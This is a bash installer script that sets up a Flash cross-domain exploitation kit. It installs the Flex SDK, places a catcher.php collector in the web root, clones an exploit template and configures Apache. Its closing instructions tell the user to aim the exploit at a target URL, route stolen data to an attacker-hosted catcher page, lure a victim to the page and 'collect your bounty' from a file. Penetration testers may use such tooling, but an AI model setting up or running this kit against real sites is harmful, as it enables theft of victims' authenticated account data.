#!/bin/bash
# Seth Art

WORKING_DIRECTORY=`pwd`
gather-info()
{
  echo
  echo "This install script will perform the following actions:"
  echo "  1) Download and install openjdk-6-jdk and php5"
  echo "  2) Download and install Adobe Flex (A 230mb download)"
  echo "  3) Drop a php \"catcher.php\" script in the web root"
  echo "  4) Download Gursev Kalra\'s ActionScript3 template"
  echo "  5) Provide you my additional ActionScript3 examples"
  echo "  6) Configure your Apache instance to support SSL"
  echo "  7) Restart your Apache instance"
  echo "  8) Give you some guidance on how to compile your ActionScript3 into a SWF"
  echo
  echo "Unrelated to compiling SWF files, this script will also copy the" 
  echo "http-crossdomain.nse NMAP script into /usr/share/nmap/scripts/ "
  echo "so that you can use it. I'll remove this once the nse gets added"
  echo "to NMAP."
  echo 
  echo
  echo "Before we get started, here is your opportunity to deviate from "
  echo "the default file locations. "
  echo 
  echo "To accept the default settings, just hit enter:"

  read -p "  * Flex Install Location [/opt/flex]: " FLEX_LOCATION
  if [ -z "$FLEX_LOCATION" ]; then
    FLEX_LOCATION=/opt/flex
  fi
  read -p "  * Location for catcher.php [/var/www/crossdomain]: " CATCHER_LOCATION
  if [ -z "$CATCHER_LOCATION" ]; then
    CATCHER_LOCATION=/var/www/crossdomain
  fi
  read -p "  * Location for xdx.html [/var/www/crossdomain]: " XDX_LOCATION
  if [ -z "$XDX_LOCATION" ]; then
    XDX_LOCATION=/var/www/crossdomain
  fi
  read -p "  * Location for ActionScript3 templates [~/crossdomain]: " AS_LOCATION
  if [ -z "$AS_LOCATION" ]; then
    AS_LOCATION=~/crossdomain
  fi
  echo 
  echo 
}


main()
{
  apt-get install -y openjdk-6-jdk php5
  if [ ! -d $FLEX_LOCATION ]; then
    mkdir $FLEX_LOCATION 
  fi
  cd $FLEX_LOCATION/ 
  if [ ! -f flex_sdk_4.6.zip ]; then
    download-flex
  else
    FLEX_CHECKSUM=`sha512sum $FLEX_LOCATION/flex_sdk_4.6.zip | awk '{print $1}'`
    if [ "$FLEX_CHECKSUM" != "e553553c2a536b31400c444b84a697e337f33eded344ffaaa8b8978a237e5a77f358f850073003b4bfd519e5947a5a1ca1c87324336b922d4ccda7cd94889737" ]; then
      download-flex
    fi    
  fi

  if [ ! -d $CATCHER_LOCATION ]; then
    mkdir $CATCHER_LOCATION 
    cp $WORKING_DIRECTORY/catcher.php $CATCHER_LOCATION/
  fi
  if [ ! -d $AS_LOCATION ]; then
    mkdir $AS_LOCATION
  fi 
  cd $AS_LOCATION/
  if [ ! -d ~/flash-xdomain-xploit ]; then
    git clone https://github.com/gursev/flash-xdomain-xploit.git
    cp flash-xdomain-xploit/xdx.html $XDX_LOCATION/
    cp flash-xdomain-xploit/XDomainXploit.as $AS_LOCATION/
  fi
  make-ssl-cert generate-default-snakeoil --force-overwrite
  a2enmod ssl
  a2ensite default-ssl
  /etc/init.d/apache2 restart

  cp $WORKING_DIRECTORY/http-crossdomain.nse /usr/share/nmap/scripts/
}

download-flex()
{
  wget http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip
  FLEX_CHECKSUM=`sha512sum $FLEX_LOCATION/flex_sdk_4.6.zip | awk '{print $1}'`
  if [ "$FLEX_CHECKSUM" == "e553553c2a536b31400c444b84a697e337f33eded344ffaaa8b8978a237e5a77f358f850073003b4bfd519e5947a5a1ca1c87324336b922d4ccda7cd94889737" ]; then
    unzip -o flex_sdk_4.6.zip 
    chmod -R a+rx $FLEX_LOCATION/
    echo 'export PATH=$FLEX_LOCATION/bin:$PATH' >> ~/.bashrc
    chmod 755 bin/mxmlc
  else
    read -p "Invalid checksum for flex_sdk_4.6.zip download.  Are you sure you want to continue? (y/n)" CK_SM_CONT
    if [ "$CK_SM_CONT" == "y" ]; then
      unzip flex_sdk_4.6.zip 
      chmod -R a+rx $FLEX_LOCATION/
      echo 'export PATH=$FLEX_LOCATION/bin:$PATH' >> ~/.bashrc
      chmod 755 bin/mxmlc
    else
      exit 
    fi
  fi


}

print-next-steps()
{
  echo
  echo
  echo
  echo "*****************"
  echo "*  Next Steps   *"
  echo "*****************"
  echo ""
  echo "1) Edit the $AS_LOCATION/XDomainXploit.as file"
  echo ""
  echo "   a) Specify the target URL"
  echo "        Something like: http://vulnerable.com/account/settings"
  echo "   b) Specify the server and page you want to send the data to:"
  echo "        Something like: http://attacker/crossdomain/catcher.php"
  echo ""
  echo "2) Compile the file:"
  echo ""
  echo "   a) $FLEX_LOCATION/bin/mxmlc $AS_LOCATION/XDomainXploit.as --output $XDX_LOCATION/XDomainXploit.swf"
  echo ""
  echo "3) Edit $XDX_LOCATION/xdx.html and make sure it is pointing to the right SWF file"
  echo "4) Get your victim to navigate to http://<your-hostname-or-ip>/<path>/xdx.html"
  echo "5) Collect your bounty at /tmp/crossdomain_bounty.txt"
  echo ""
  echo "* Additional templates have been provided, and are located in the following directory:"
  echo "* $WORKING_DIRECTORY/actionscript-templates"
  echo ""     
  echo "Good luck!"
  echo ""
}

gather-info
main
print-next-steps
